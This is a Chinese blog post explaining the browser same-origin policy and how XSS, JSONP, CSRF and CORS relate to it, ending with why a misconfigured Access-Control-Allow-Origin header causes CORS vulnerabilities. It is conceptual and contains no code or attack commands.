同源策略以及出现的各类安全问题

发表于 2019-05-23 | 分类于 前端安全
字数统计: 2,057 字 | 阅读时长 ≈ 8 分钟

同源策略(SOP)

源：

同’源’中的’源’：协议+域名+端口
只有两个页面具有相同的 协议+域名+端口，那么他们称之为同源。(子域名也不是同源的。例如：test.com和sub.test.com)

同源策略：

同源策略是浏览器的一个安全模型，它规定了：不同源的两个客户端脚本在没有授权的情况下，不能读写对方的资源。(同时这里需要注意的一个概念：同源策略是浏览器的一种安全措施，它并没有禁止脚本的执行，只是由于同源策略的作用禁止读取HTTP回复，实际上，脚本是成功运行了的)

没有同源策略会产生的危害：

如果没有同源策略的作用，任意站点之间可以可以操作资源，当你在访问一个合法网站的时候，又打开了一个恶意网站，包含了恶意脚本，恶意脚本便可以操作合法网站上的一切资源。

出现的问题：

禁止了跨域，一定程度上来说就限制了前端功能的实现，就会出现各种跨域。其中包含XSS, CSRF, JSONP, CORS。

关于XSS和JSONP：因为 XSS 和 JSONP都是用上述的标签来实现的，所以浏览器的同源策略对其影响并不大。

关于CSRF：因为同源策略是浏览器的安全策略，并没有禁止脚本的运行，只是禁止了读取HTTP请求的回复。所以实际上请求是发送成功的，而 CSRF 就是当请求发送成功，服务器端执行成功，那么 CSRF 就相当于攻击成功了，并不需要服务器的回复。
而同源策略对于 CSRF 的防御作用就是：防止 CSRF 请求读取异源的授权的token。

关于CORS：CORS又称为跨域资源共享。是H5提供的一种机制，WEB应用程序可以通过在HTTP增加字段来告诉浏览器，哪些不同来源的服务器是有权访问本站资源的，当不同域的请求发生时，就出现了跨域的现象。

CORS漏洞：

跨域访问的场景：

1、前后端分离，前端和后端在不同的域名上，后端通过提供接口给前端使用。此时就会发生跨域的请求。
2、在本地做开发，本地的文件夹并不是在同一个域下面，当一个文件需要发送ajax请求，请求另外一个页面的内容的时候，就会跨域。
3、电商网站想通过用户浏览器加载第三方快递网站的物流信息。
4、子站域名希望调用主站域名的用户资料接口，并将数据显示出来。

如果这两条配置遇到了，允许所有主机带上cookie跨域请求资源，那么浏览器会自动判别为这是极度危险的，会拒接呈现服务端返回的资源。容易造成用户个人数据被窃取。

为什么会出现CORS漏洞(跨域资源共享漏洞)：

1、前面说到，因为在很多情况下需要在两个域名之间进行接口调用、资源共享，就存在CORS。
2、跨域资源共享，需要配置允许跨域的主机：Access-Control-Allow-Origin。如果配置不当，造成攻击者就可以绕过跨域限制，形成CORS漏洞。
